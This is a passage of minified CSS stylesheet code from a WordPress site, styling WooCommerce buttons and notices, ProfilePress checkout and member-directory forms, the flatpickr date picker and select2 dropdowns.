button.button.disabled:hover,.woocommerce:where(body:not(.woocommerce-block-theme-has-button-styles)) button.button:disabled:hover,.woocommerce:where(body:not(.woocommerce-block-theme-has-button-styles)) button.button:disabled[disabled]:hover,.woocommerce:where(body:not(.woocommerce-block-theme-has-button-styles)) input.button.disabled:hover,.woocommerce:where(body:not(.woocommerce-block-theme-has-button-styles)) input.button:disabled:hover,.woocommerce:where(body:not(.woocommerce-block-theme-has-button-styles)) input.button:disabled[disabled]:hover,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce #respond input#submit.disabled:hover,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce #respond input#submit:disabled:hover,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce #respond input#submit:disabled[disabled]:hover,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce a.button.disabled:hover,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce a.button:disabled:hover,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce a.button:disabled[disabled]:hover,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce button.button.disabled:hover,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce button.button:disabled:hover,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce button.button:disabled[disabled]:hover,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce input.button.disabled:hover,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce input.button:disabled:hover,:where(body:not(.woocommerce-block-theme-has-button-styles)):where(:not(.edit-post-visual-editor)) .woocommerce input.button:disabled[disabled]:hover{color:inherit;background-color:#e9e6ed}.woocommerce:where(body:not(.woocommerce-uses-block-theme)) div.product p.price,.woocommerce:where(body:not(.woocommerce-uses-block-theme)) div.product span.price{color:#958e09;font-size:1.25em}.woocommerce:where(body:not(.woocommerce-uses-block-theme)) ul.products li.product .price{color:#958e09}.woocommerce-error,.woocommerce-message{padding:1em 2em 1em 3.5em;margin:0 0 2em;position:relative;background-color:#f6f5f8;color:#515151;border-top:3px solid #720eec;list-style:none;width:auto;word-wrap:break-word}.woocommerce-error::after,.woocommerce-error::before,.woocommerce-message::after,.woocommerce-message::before{content:" ";display:table}.woocommerce-error::after,.woocommerce-message::after{clear:both}.woocommerce-error::before,.woocommerce-message::before{font-family:WooCommerce;content:"\e028";content:"\e028"/"";display:inline-block;position:absolute;top:1em;left:1.5em}.woocommerce-error .button,.woocommerce-message .button{float:right}.woocommerce-error li,.woocommerce-message li{list-style:none!important;padding-left:0!important;margin-left:0!important}.woocommerce-message{border-top-color:#8fae1b}.woocommerce-message::before{content:"\e015";color:#8fae1b}.woocommerce-error{border-top-color:#b81c23}.woocommerce-error::before{content:"\e016";color:#b81c23}@keyframes ppress-dual-ring{0%{transform:rotate(0)}to{transform:rotate(360deg)}}.ppress-checkout__form *{--ppress-heading-fs:22px;--ppress-body-fs:16px;--ppress-btn-color:#2563eb;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;font-size:var(--ppress-body-fs)}.ppress-checkout__form{margin:1px auto 10px;max-width:100%;width:100%;line-height:20px;position:relative}.ppress-checkout__form p{margin:0 0 5px;padding:0}.ppress-checkout__form{display:flex;flex-wrap:wrap}.ppress-checkout__form .ppress-checkout_order_summary__bottom_details *{font-size:var(--ppress-body-fs)}.ppress-checkout__form .ppress-checkout_order_summary__bottom_details{padding:10px 20px}.ppress-checkout__form a.ppress-checkout-show-login-form{cursor:pointer;float:right;font-size:14px;font-weight:400;line-height:35px;margin:0;padding:0;text-decoration:none;vertical-align:baseline}.ppress-checkout__form .ppress-checkout-form__payment_method{border-top:1px solid #ddd;padding:0}.ppress-checkout__form .ppress-checkout-form__payment_method:first-of-type{border-top:none;border-bottom:none}.ppress-checkout__form .ppress-checkout-form__terms_condition__content{border:1px solid #e5e7eb;padding:20px;max-height:200px;overflow:auto;border-radius:6px;display:none;margin:0 0 20px}.ppress-checkout__form .ppress-checkout__form__preloader{position:absolute;top:0;width:100%;height:100%;background:rgba(250,250,250,.9);z-index:99995}.ppress-checkout__form .ppress-checkout__form__spinner{display:block;width:85px;height:85px;top:40%;right:50%;text-align:center;margin:auto;position:fixed}.ppress-checkout__form .ppress-checkout__form__spinner:after{content:" ";display:block;width:70px;height:70px;margin:8px;border-radius:50%;border:6px solid #212529;border-color:#212529 transparent;animation:1.2s linear infinite ppress-dual-ring}.ppress-checkout__form .ppress-checkout-alert{width:100%;padding:12px 16px;border-radius:6px;margin:10px 0}.ppress-checkout__form .ppress-checkout-alert ul{margin:0 0 0 16px;padding:0;list-style-type:disc}.ppress-checkout__form .ppress-checkout-alert li{font-size:var(--ppress-body-fs);font-weight:400;margin:0!important;padding:0!important;line-height:22px}.ppress-checkout__form .ppress-checkout-alert li strong,.ppress-checkout__form .ppress-checkout-alert p{font-size:var(--ppress-body-fs);margin:0!important;padding:0!important;line-height:22px}.ppress-checkout__form .ppress-checkout-alert li strong{font-weight:700}.ppress-checkout__form .ppress-checkout-alert p{font-weight:500}.flatpickr-current-month .flatpickr-monthDropdown-months{display:inline-block!important}#pp-pass-strength-result{background-color:#eee;border:1px solid #ddd;color:#23282d;padding:3px 5px;text-align:center;width:100%;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box}#pp-pass-strength-result.short{background-color:#f1adad;border-color:#e35b5b;opacity:1}#pp-pass-strength-result.bad{background-color:#fbc5a9;border-color:#f78b53;opacity:1}#pp-pass-strength-result.good{background-color:#ffe399;border-color:#ffc733;opacity:1}#pp-pass-strength-result.strong{background-color:#c1e1b9;border-color:#83c373;opacity:1}.pp-form-container *{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box}.pp-form-container .pp-form-wrapper.ppBuildScratch.ppfl-material .pp-form-field-wrap span.select2-selection.select2-selection--multiple,html .pp-form-container .select2 input.select2-search__field{border:0!important}.pp-form-container form input[type=submit]{-webkit-appearance:none!important;cursor:pointer;text-shadow:none}.pp-form-container form{margin:0;padding:0;background-color:transparent}.pp-form-container form input,.pp-form-container form select,.pp-form-container form textarea{outline:0;background-image:none;height:auto;float:none;position:static;box-shadow:none;text-shadow:none;text-transform:none;text-decoration:none;resize:vertical}.pp-form-container form p{margin:0 0 .5em}.pp-form-container form input[type=submit]:focus{outline:0}.pp-form-container .pp-user-avatar{border-radius:50%!important;display:block!important;margin:0 auto 10px!important;text-align:center!important}.pp-form-container .pp-form-wrapper.ppBuildScratch.ppfl-material .pp-form-field-wrap .select2.select2-container{border:0!important;border-bottom:1px solid #dbdbdb!important;padding-left:0!important}.pp-form-container .pp-form-wrapper.ppBuildScratch.ppfl-flat .pp-form-field-wrap .select2-selection{border:0!important;background:#f7f7f7!important}#profilepress-myaccount-wrapper .profilepress-myaccount-content .select2-selection{border-radius:.25em;transition:border-color .15s ease-in-out,box-shadow .15s ease-in-out;box-shadow:inset 0 1px 1px rgba(0,0,0,.125)}html .select2.select2-container .select2-selection.select2-selection--multiple input.select2-search__field{border:0!important;height:auto!important}.select2.select2-container .select2-selection.select2-selection--multiple input.select2-search__field{border:0!important;box-shadow:none!important}.select2.select2-container .select2-selection.select2-selection--multiple li.select2-selection__choice{height:auto;line-height:normal}.pp-member-directory .ppressmd-member-directory-header .ppressmd-member-directory-header-row .ppressmd-search .ppressmd-search-filter.ppressmd-text-filter-type input:not(.select2-search__field),.pp-member-directory .ppressmd-member-directory-header .select2.select2-container .select2-selection{background-color:transparent;border:1px solid #ddd!important}.pp-member-directory .ppressmd-member-directory-header .select2.select2-container .select2-selection__rendered{color:#666;background-color:transparent}.pp-member-directory .ppressmd-member-directory-header .select2.select2-container{width:100%!important}.pp-member-directory .ppressmd-member-directory-header .select2-search.select2-search--inline .select2-search__field{width:auto!important}.pp-member-directory .ppressmd-member-directory-header .select2.select2-container .select2-selection{display:block!important;height:40px;padding:0 0 0 12px!important;overflow:hidden!important;position:relative!important;white-space:nowrap!important;line-height:35px!important;font-size:15px!important;text-align:left!important;text-decoration:none!important;-moz-border-radius:2px!important;-webkit-border-radius:2px!important;border-radius:2px!important;background-clip:padding-box!important;-webkit-touch-callout:none;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;background:0 0!important}.pp-member-directory .ppressmd-member-directory-header .select2.select2-container .select2-selection .select2-selection__arrow{display:inline-block!important;width:34px!important;height:100%!important;position:absolute!important;right:0!important;top:0!important;-moz-border-radius:0 2px 2px 0!important;-webkit-border-radius:0 2px 2px 0!important;border-radius:0 2px 2px 0!important;background-clip:padding-box!important;text-align:center!important;background:0 0!important;border-left:0!important}.pp-member-directory .ppressmd-member-directory-header .select2-container.select2-container--open .select2-dropdown{border:1px solid #ddd;border-top:0;border-radius:0}.pp-member-directory .ppressmd-member-directory-header .select2-container.select2-container--open .select2-dropdown .select2-results li{list-style:none;display:list-item;background-image:none;font-size:15px;margin:5px!important;color:#666!important;padding:3px 7px 4px!important;cursor:pointer;min-height:1em!important}.pp-member-directory .ppressmd-member-directory-header .select2.select2-container .select2-selection.select2-selection--multiple{height:auto!important;line-height:.8!important}.pp-member-directory .ppressmd-member-directory-header .select2-container--default .select2-selection--single .select2-selection__rendered{padding-left:0!important;line-height:37px}.pp-member-directory .ppressmd-member-directory-header .select2-container--default .select2-selection--multiple .select2-selection__rendered{line-height:37px;box-sizing:border-box;list-style:none;margin:0;padding-left:0!important;padding-right:30px;width:100%;font-size:13px}.pp-member-directory .ppressmd-member-directory-header .select2-results li.select2-results__option.select2-results__option--highlighted{background:0 0!important;background:#f4f4f4!important;color:#666!important}.pp-member-directory .ppressmd-member-directory-header .select2-container--default .select2-selection--single .select2-selection__clear{right:10px;margin:0!important}.pp-member-directory .ppressmd-member-directory-header .select2-container--default .select2-selection--multiple .select2-selection__clear{right:10px;font-size:30px;margin:0!important}.pp-member-directory .ppressmd-member-directory-header .select2-container--default .select2-selection--multiple .select2-selection__clear,.pp-member-directory .ppressmd-member-directory-header .select2-container--default .select2-selection--single .select2-selection__arrow b,.pp-member-directory .ppressmd-member-directory-header .select2-container--default .select2-selection--single .select2-selection__clear{color:#888!important}.pp-member-directory .ppressmd-member-directory-header .select2-container--default .select2-selection--multiple .select2-selection__clear{position:absolute}.pp-member-directory .ppressmd-member-directory-header .select2-container--default .select2-selection--multiple .select2-selection__choice{padding:3px 3px 3px 5px}.pp-member-directory .ppressmd-member-directory-header .select2-container .select2-search.select2-search--inline>input{border:0!important;padding:0!important;border-radius:0!important}.pp-member-directory .ppressmd-member-directory-header .select2-container--default .select2-selection--multiple .select2-selection__rendered li{overflow-x:hidden;text-overflow:ellipsis;max-width:100%;box-sizing:border-box}.pp-member-directory .ppressmd-member-directory-header .select2-container--default .select2-selection--single .select2-selection__clear{font-size:20px!important}p:has(+.ppress-paywall-message-wrap){margin-bottom:0}@-webkit-keyframes fpFadeInDown{0%{opacity:0;-webkit-transform:translate3d(0,-20px,0);transform:translate3d(0,-20px,0)}to{opacity:1;-webkit-transform:translate3d(0,0,0);transform:translate3d(0,0,0)}}@keyframes fpFadeInDown{0%{opacity:0;-webkit-transform:translate3d(0,-20px,0);transform:translate3d(0,-20px,0)}to{opacity:1;-webkit-transform:translate3d(0,0,0);transform:translate3d(0,0,0)}}.flatpickr-calendar{background:0 0;opacity:0;display:none;text-align:center;visibility:hidden;padding:0;-webkit-animation:none;animation:none;direction:ltr;border:0;font-size:14px;line-height:24px;border-radius:5px;position:absolute;width:307.875px;box-sizing:border-box;touch-action:manipulation;background:#fff;box-shadow:1px 0 0#e6e6e6,-1px 0 0#e6e6e6,0 1px 0#e6e6e6,0-1px 0#e6e6e6,0 3px 13px rgba(0,0,0,.08)}.flatpickr-calendar.inline,.flatpickr-calendar.open{opacity:1;max-height:640px;visibility:visible}.flatpickr-calendar.open{display:inline-block;z-index:99999}.flatpickr-calendar.animate.open{-webkit-animation:.3s cubic-bezier(.23,1,.32,1) fpFadeInDown;animation:.3s cubic-bezier(.23,1,.32,1) fpFadeInDown}.flatpickr-calendar.inline{display:block;position:relative;top:2px}.flatpickr-calendar.static{position:absolute;top:calc(100% + 2px)}.flatpickr-calendar.static.open{z-index:999;display:block}.flatpickr-calendar.multiMonth .flatpickr-days .dayContainer:nth-child(n+1) .flatpickr-day.inRange:nth-child(7n+7){box-shadow:none!important}.flatpickr-calendar.multiMonth .flatpickr-days .dayContainer:nth-child(n+2) .flatpickr-day.inRange:nth-child(7n+1){box-shadow:-2px 0 0#e6e6e6,5px 0 0#e6e6e6}.flatpickr-calendar .hasTime .dayContainer,.flatpickr-calendar .hasWeeks .dayContainer{border-bottom:0;border-bottom-right-radius:0;border-bottom-left-radius:0}.flatpickr-calendar .hasWeeks .dayContainer{border-left:0}.flatpickr-calendar.hasTime .flatpickr-time{height:40px;border-top:1px solid #e6e6e6}.flatpickr-calendar.noCalendar.hasTime .flatpickr-time{height:auto}.flatpickr-calendar:after,.flatpickr-calendar:before{position:absolute;display:block;pointer-events:none;border:solid transparent;content:"";height:0;width:0;left:22px}.flatpickr-calendar.arrowRight:after,.flatpickr-calendar.arrowRight:before,.flatpickr-calendar.rightMost:after,.flatpickr-calendar.rightMost:before{left:auto;right:22px}.flatpickr-calendar.arrowCenter:after,.flatpickr-calendar.arrowCenter:before{left:50%;right:50%}.flatpickr-calendar:before{border-width:5px;margin:0-5px}.flatpickr-calendar:after{border-width:4px;margin:0-4px}.flatpickr-calendar.arrowTop:after,.flatpickr-calendar.arrowTop:before{bottom:100%}.flatpickr-calendar.arrowTop:before{border-bottom-color:#e6e6e6}.flatpickr-calendar.arrowTop:after{border-bottom-color:#fff}.flatpickr-calendar.arrowBottom:after,.flatpickr-calendar.arrowBottom:before{top:100%}.flatpickr-calendar.arrowBottom:before{border-top-color:#e6e6e6}.flatpickr-calendar.arrowBottom:after{border-top-color:#fff}.flatpickr-calendar:focus,.flatpickr-current-month input.cur-year:focus{outline:0}.flatpickr-wrapper{position:relative;display:inline-block}.flatpickr-months{display:flex}.flatpickr-months .flatpickr-month,.flatpickr-months .flatpickr-next-month,.flatpickr-months .flatpickr-prev-month{-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;height:34px;color:rgba(0,0,0,.9);fill:rgba(0,0,0,.9)}.flatpickr-months .flatpickr-month{background:0 0;line-height:1;text-align:center;position:relative;overflow:hidden;flex:1}.flatpickr-months .flatpickr-next-month,.flatpickr-months .flatpickr-prev-month{text-decoration:none;cursor:pointer;position:absolute;top:0;padding:10px;z-index:3}.flatpickr-months .flatpickr-next-month.flatpickr-disabled,.flatpickr-months .flatpickr-prev-month.flatpickr-disabled{display:none}.flatpickr-months .flatpickr-next-month i,.flatpickr-months .flatpickr-prev-month i,.numInputWrapper{position:relative}.flatpickr-months .flatpickr-next-month.flatpickr-prev-month,.flatpickr-months .flatpickr-prev-month.flatpickr-prev-month{left:0}.flatpickr-months .flatpickr-next-month.flatpickr-next-month,.flatpickr-months .flatpickr-prev-month.flatpickr-next-month{right:0}.flatpickr-months .flatpickr-next-month:hover,.flatpickr-months .flatpickr-prev-month:hover{color:#959ea9}.flatpickr-months .flatpickr-next-month:hover svg,.flatpickr-months .flatpickr-prev-month:hover svg{fill:#f64747}.flatpickr-months .flatpickr-next-month svg,.flatpickr-months .flatpickr-prev-month svg{width:14px;height:14px}.flatpickr-months .flatpickr-next-month svg path,.flatpickr-months .flatpickr-prev-month svg path{transition:fill .1s;fill:inherit}.numInputWrapper{height:auto}.numInputWrapper input,.numInputWrapper span{display:inline-block}.numInputWrapper input{width:100%}.numInputWrapper input::-ms-clear{display:none}.numInputWrapper input::-webkit-inner-spin-button,.numInputWrapper input::-webkit-outer-spin-button{margin:0;-webkit-appearance:none}.numInputWrapper span{position:absolute;right:0;width:14px;padding:0 4px 0 2px;height:50%;line-height:50%;opacity:0;cursor:pointer;border:1px solid rgba(57,57,57,.15);box-sizing:border-box}.numInputWrapper span:hover{background:rgba(0,0,0,.1)}.numInputWrapper span:active{background:rgba(0,0,0,.2)}.numInputWrapper span:after{display:block;content:"";position:absolute}.numInputWrapper span.arrowUp{top:0;border-bottom:0}.numInputWrapper span.arrowUp:after{border-left:4px solid transparent;border-right:4px solid transparent;border-bottom:4px solid rgba(57,57,57,.6);top:26%}.numInputWrapper span.arrowDown{top:50%}.numInputWrapper span.arrowDown:after{border-left:4px solid transparent;border-right:4px solid transparent;border-top:4px solid rgba(57,57,57,.6);top:40%}.numInputWrapper span svg{width:inherit;height:auto}.numInputWrapper span svg path{fill:rgba(0,0,0,.5)}.flatpickr-current-month span.cur-month:hover,.numInputWrapper:hover{background:rgba(0,0,0,.05)}.numInputWrapper:hover span{opacity:1}.flatpickr-current-month{font-size:135%;font-weight:300;color:inherit;position:absolute;width:75%;left:12.5%;padding:7.48px 0 0;line-height:1;height:34px;display:inline-block;text-align:center;-webkit-transform:translate3d(0,0,0);transform:translate3d(0,0,0)}.flatpickr-current-month span.cur-month{font-family:inherit;font-weight:700;color:inherit;display:inline-block;margin-left:.5ch;padding:0}.flatpickr-current-month .numInputWrapper{width:6ch;display:inline-block}.flatpickr-current-month .numInputWrapper span.arrowUp:after{border-bottom-color:rgba(0,0,0,.9)}.flatpickr-current-month .numInputWrapper span.arrowDown:after{border-top-color:rgba(0,0,0,.9)}.flatpickr-current-month .flatpickr-monthDropdown-months,.flatpickr-current-month input.cur-year{background:0 0;border:0;border-radius:0;box-sizing:border-box;color:inherit;font-size:inherit;font-family:inherit;font-weight:300;height:auto;line-height:inherit;padding:0 0 0 .5ch;vertical-align:initial}.flatpickr-current-month input.cur-year{cursor:text;margin:0;display:inline-block;-webkit-appearance:textfield;-moz-appearance:textfield;appearance:textfield}.flatpickr-current-month input.cur-year[disabled],.flatpickr-current-month input.cur-year[disabled]:hover{font-size:100%;color:rgba(0,0,0,.5);background:0 0;pointer-events:none}.flatpickr-current-month .flatpickr-monthDropdown-months{appearance:menulist;cursor:pointer;margin:-1px 0 0;outline:0;position:relative;-webkit-box-sizing:border-box;-webkit-appearance:menulist;-moz-appearance:menulist;width:auto}.flatpickr-current-month .flatpickr-monthDropdown-months:active,.flatpickr-current-month .flatpickr-monthDropdown-months:focus{outline:0}.flatpickr-current-month .flatpickr-monthDropdown-months:hover{background:rgba(0,0,0,.05)}.flatpickr-current-month .flatpickr-monthDropdown-months .flatpickr-monthDropdown-month{background-color:transparent;outline:0;padding:0}.flatpickr-weekdays{background:0 0;text-align:center;overflow:hidden;width:100%;display:flex;align-items:center;height:28px}.flatpickr-weekdays .flatpickr-weekdaycontainer{display:flex;flex:1}span.flatpickr-weekday{cursor:default;font-size:90%;background:0 0;color:rgba(0,0,0,.54);line-height:1;margin:0;text-align:center;display:block;flex:1;font-weight:bolder}.flatpickr-weeks{padding:1px 0 0}.flatpickr-days{position:relative;overflow:hidden;display:flex;align-items:flex-start;width:307.875px}.flatpickr-days:focus{outline:0}.dayContainer,.flatpickr-day{box-sizing:border-box;display:inline-block}.dayContainer{padding:0;outline:0;text-align:left;width:307.875px;min-width:307.875px;max-width:307.875px;display:flex;flex-wrap:wrap;-ms-flex-wrap:wrap;justify-content:space-around;-webkit-transform:translate3d(0,0,0);transform:translate3d(0,0,0);opacity:1}.dayContainer+.dayContainer{box-shadow:-1px 0 0#e6e6e6}.flatpickr-day{background:0 0;border:1px solid transparent;border-radius:150px;color:#393939;cursor:pointer;font-weight:400;width:14.2857143%;flex-basis:14.2857143%;max-width:39px;height:39px;line-height:39px;margin:0;position:relative;justify-content:center;text-align:center}.flatpickr-day.inRange,.flatpickr-day.nextMonthDay.inRange,.flatpickr-day.nextMonthDay.today.inRange,.flatpickr-day.nextMonthDay:focus,.flatpickr-day.nextMonthDay:hover,.flatpickr-day.prevMonthDay.inRange,.flatpickr-day.prevMonthDay.today.inRange,.flatpickr-day.prevMonthDay:focus,.flatpickr-day.prevMonthDay:hover,.flatpickr-day.today.inRange,.flatpickr-day:focus,.flatpickr-day:hover{cursor:pointer;outline:0;background:#e6e6e6;border-color:#e6e6e6}.flatpickr-day.today{border-color:#959ea9}.flatpickr-day.today:focus,.flatpickr-day.today:hover{border-color:#959ea9;background:#959ea9;color:#fff}.flatpickr-day.endRange,.flatpickr-day.endRange.inRange,.flatpickr-day.endRange.nextMonthDay,.flatpickr-day.endRange.prevMonthDay,.flatpickr-day.endRange:focus,.flatpickr-day.endRange:hover,.flatpickr-day.selected,.flatpickr-day.selected.inRange,.flatpickr-day.selected.nextMonthDay,.flatpickr-day.selected.prevMonthDay,.flatpickr-day.selected:focus,.flatpickr-day.selected:hover,.flatpickr-day.startRange,.flatpickr-day.startRange.inRange,.flatpickr-day.startRange.nextMonthDay,.flatpickr-day.startRange.prevMonthDay,.flatpickr-day.startRange:focus,.flatpickr-day.startRange:hover{background:#569ff7;box-shadow:none;color:#fff;border-color:#569ff7}.flatpickr-day.endRange.startRange,.flatpickr-day.selected.startRange,.flatpickr-day.startRange.startRange{border-radius:50px 0 0 50px}.flatpickr-day.endRange.endRange,.flatpickr-day.selected.endRange,.flatpickr-day.startRange.endRange{border-radius:0 50px 50px 0}.flatpickr-day.endRange.startRange+.endRange:not(:nth-child(7n+1)),.flatpickr-day.selected.startRange+.endRange:not(:nth-child(7n+1)),.flatpickr-day.startRange.startRange+.endRange:not(:nth-child(7n+1)){box-shadow:-10px 0 0#569ff7}.flatpickr-day.endRange.startRange.endRange,.flatpickr-day.selected.startRange.endRange,.flatpickr-day.startRange.startRange.endRange{border-radius:50px}.flatpickr-day.inRange{border-radius:0;box-shadow:-5px 0 0#e6e6e6,5px 0 0#e6e6e6}.flatpickr-day.flatpickr-disabled,.flatpickr-day.flatpickr-disabled:hover{background:0 0;border-color:transparent}.flatpickr-day.nextMonthDay,.flatpickr-day.notAllowed,.flatpickr-day.notAllowed.nextMonthDay,.flatpickr-day.notAllowed.prevMonthDay,.flatpickr-day.prevMonthDay{color:rgba(57,57,57,.3);background:0 0;border-color:transparent;cursor:default}.flatpickr-day.flatpickr-disabled,.flatpickr-day.flatpickr-disabled:hover{cursor:not-allowed;color:rgba(57,57,57,.1)}.flatpickr-day.week.selected{border-radius:0;box-shadow:-5px 0 0#569ff7,5px 0 0#569ff7}.flatpickr-day.hidden{visibility:hidden}.rangeMode .flatpickr-day{margin-top:1px}.flatpickr-weekwrapper{float:left}.flatpickr-weekwrapper .flatpickr-weeks{padding:0 12px;box-shadow:1px 0 0#e6e6e6}.flatpickr-weekwrapper .flatpickr-weekday{float:none;width:100%;line-height:28px}.flatpickr-weekwrapper span.flatpickr-day,.flatpickr-weekwrapper span.flatpickr-day:hover{display:block;width:100%;max-width:none;color:rgba(57,57,57,.3);background:0 0;cursor:default;border:0}.flatpickr-innerContainer{display:block;display:flex;box-sizing:border-box;overflow:hidden}.flatpickr-rContainer{display:inline-block;padding:0;box-sizing:border-box}.flatpickr-time,.flatpickr-time input{text-align:center;box-sizing:border-box}.flatpickr-time{outline:0;display:block;height:0;line-height:40px;max-height:40px;overflow:hidden;display:flex}.flatpickr-time:after{content:"";display:table;clear:both}.flatpickr-time .numInputWrapper{flex:1;width:40%;height:40px;float:left}.flatpickr-time .numInputWrapper span.arrowUp:after{border-bottom-color:#393939}.flatpickr-time .numInputWrapper span.arrowDown:after{border-top-color:#393939}.flatpickr-time.hasSeconds .numInputWrapper{width:26%}.flatpickr-time.time24hr .numInputWrapper{width:49%}.flatpickr-time input{background:0 0;box-shadow:none;border:0;border-radius:0;margin:0;padding:0;height:inherit;line-height:inherit;color:#393939;font-size:14px;position:relative;-webkit-appearance:textfield;-moz-appearance:textfield;appearance:textfield}.flatpickr-time input.flatpickr-hour{font-weight:700}.flatpickr-time input.flatpickr-minute,.flatpickr-time input.flatpickr-second{font-weight:400}.flatpickr-time input:focus{outline:0;border:0}.flatpickr-time .flatpickr-am-pm,.flatpickr-time .flatpickr-time-separator{height:inherit;float:left;line-height:inherit;color:#393939;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;align-self:center}.flatpickr-time .flatpickr-time-separator{font-weight:700;width:2%}.flatpickr-time .flatpickr-am-pm{outline:0;width:18%;cursor:pointer;text-align:center;font-weight:400}.flatpickr-time .flatpickr-am-pm:focus,.flatpickr-time .flatpickr-am-pm:hover,.flatpickr-time input:focus,.flatpickr-time input:hover{background:#eee}.flatpickr-input[readonly]{cursor:pointer}.select2-container{box-sizing:border-box;display:inline-block;margin:0;position:relative;vertical-align:middle}.select2-container .select2-selection--single{box-sizing:border-box;cursor:pointer;display:block;height:28px;user-select:none;-webkit-user-select:none}.select2-container .select2-selection--single .select2-selection__rendered{display:block;padding-left:8px;padding-right:20px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.select2-container .select2-selection--single .select2-selection__clear{position:relative}.select2-container[dir=rtl] .select2-selection--single .select2-selection__rendered{padding-right:8px;padding-left:20px}.select2-container .select2-selection--multiple{box-sizing:border-box;cursor:pointer;display:block;min-height:32px;user-select:none;-webkit-user-select:none}.select2-container .select2-selection--multiple .select2-selection__rendered{display:inline-block;overflow:hidden;padding-left:8px;text-overflow:ellipsis;white-space:nowrap}.select2-container .select2-search--inline{float:left}.select2-container .select2-search--inline .select2-search__field{box-sizing:border-box;border:none;font-size:100%;margin-top:5px;padding:0}.select2-container .select2-search--inline .select2-search__field::-webkit-search-cancel-button{-webkit-appearance:none}.select2-dropdown{background-color:#fff;border:1px solid #aaa;border-radius:4px;box-sizing:border-box;display:block;position:absolute;left:-100000px;width:100%;z-index:1051}.select2-results{display:block}.select2-results__options{list-style:none;margin:0;padding:0}.select2-results__option{padding:6px;user-select:none;-webkit-user-select:none}.select2-results__option[aria-selected]{cursor:pointer}.select2-container--open .select2-dropdown{left:0}.select2-container--open .select2-dropdown--above{border-bottom:none;border-bottom-left-radius:0;border-bottom-right-radius:0}.select2-container--open .select2-dropdown--below{border-top:none;border-top-left-radius:0;border-top-right-radius:0}.select2-search--dropdown{display:block;padding:4px}.select2-search--dropdown .select2-search__field{padding:4px;width:100%;box-sizing:border-box}.select2-search--dropdown .select2-search__field::-webkit-search-cancel-button{-webkit-appearance:none}.select2-search--dropdown.select2-search--hide{display:none}.select2-close-mask{border:0;margin:0;padding:0;display:block;position:fixed;left:0;top:0;min-height:100%;min-width:100%;height:auto;width:auto;opacity:0;z-index:99;background-color:#fff}.select2-hidden-accessible{border:0!important;clip:rect(0 0 0 0)!important;-webkit-clip-path:inset(50%)!important;clip-path:inset(50%)!important;height:1px!important;overflow:hidden!important;padding:0!important;position:absolute!important;width:1px!important;white-space:nowrap!important}.select2-container--default .select2-selection--single{background-color:#fff;border:1px solid #aaa;border-radius:4px}.select2-container--default .select2-selection--single .select2-selection__rendered{color:#444;line-height:28px}.select2-container--default .select2-selection--single .select2-selection__clear{cursor:pointer;float:right;font-weight:700}.select2-container--default .select2-selection--single .select2-selection__placeholder{color:#999}.select2-container--default .select2-selection--single .select2-selection__arrow{height:26px;position:absolute;top:1px;right:1px;width:20px}.select2-container--default .select2-selection--single .select2-selection__arrow b{border-color:#888 transparent transparent;border-style:solid;border-width:5px 4px 0;height:0;left:50%;margin-left:-4px;margin-top:-2px;position:absolute;top:50%;width:0}.select2-container--default[dir=rtl] .select2-selection--single .select2-selection__clear{float:left}.select2-container--default[dir=rtl] .select2-selection--single .select2-selection__arrow{left:1px;right:auto}.select2-container--default.select2-container--disabled .select2-selection--single{background-color:#eee;cursor:default}.select2-container--default.select2-container--disabled .select2-selection--single .select2-selection__clear{display:none}.select2-container--default.select2-container--open .select2-selection--single .select2-selection__arrow b{border-color:transparent transparent #888;border-width:0 4px 5px}.select2-container--default .select2-selection--multiple{background-color:#fff;border:1px solid #aaa;border-radius:4px;cursor:text}.select2-container--default .select2-selection--multiple .select2-selection__rendered{box-sizing:border-box;list-style:none;margin:0;padding:0 5px;width:100%}.select2-container--default .select2-selection--multiple .select2-selection__rendered li{list-style:none}.select2-container--default .select2-selection--multiple .select2-selection__clear{cursor:pointer;float:right;font-weight:700;margin-top:5px;margin-right:10px;padding:1px}.select2-container--default .select2-selection--multiple .select2-selection__choice{background-color:#e4e4e4;border:1px solid #aaa;border-radius:4px;cursor:default;float:left;margin-right:5px;margin-top:5px;padding:0 5px}.select2-container--default .select2-selection--multiple .select2-selection__choice__remove{color:#999;cursor:pointer;display:inline-block;font-weight:700;margin-right:2px}.select2-container--default .select2-selection--multiple .select2-selection__choice__remove:hover{color:#333}.select2-container--default[dir=rtl] .select2-selection--multiple .select2-search--inline,.select2-container--default[dir=rtl] .select2-selection--multiple .select2-selection__choice{float:right}.select2-container--default[dir=rtl] .select2-selection--multiple .select2-selection__choice{margin-left:5px;margin-right:auto}.select2-container--default[dir=rtl] .select2-selection--multiple .select2-selection__choice__remove{margin-left:2px;margin-right:auto}.select2-container--default.select2-container--focus .select2-selection--multiple{border:1px solid #000;outline:0}.select2-container--default.select2-container--disabled .select2-selection--multiple{background-color:#eee;cursor:default}.select2-container--default.select2-container--disabled .select2-selection__choice__remove{display:none}.select2-container--default.select2-container--open.select2-container--above .select2-selection--multiple,.select2-container--default.select2-container--open.select2-container--above .select2-selection--single{border-top-left-radius:0;border-top-right-radius:0}.select2-container--default.select2-container--open.select2-container--below .select2-selection--multiple,.select2-container--default.select2-container--open.select2-container--below 